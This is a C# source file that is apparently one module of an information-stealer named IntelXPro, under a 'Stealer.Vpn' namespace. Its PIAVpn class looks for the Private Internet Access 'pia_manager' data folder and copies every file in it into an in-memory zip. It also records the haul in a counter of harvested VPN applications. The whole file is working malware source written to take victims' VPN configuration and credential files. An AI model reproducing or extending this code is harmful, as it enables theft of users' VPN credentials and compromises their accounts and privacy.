using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Vpn
{
    internal class PIAVpn : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "pia_manager");
            if (Directory.Exists(text))
            {
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "PIA";
                zip.AddDirectoryFiles(text, "PIAVPN");
                counterApplications.Files.Add(text + " => PIAVPN");
                counterApplications.Files.Add("PIAVPN\\");
                counter.Vpns.Add(counterApplications);
            }
        }
    }

}
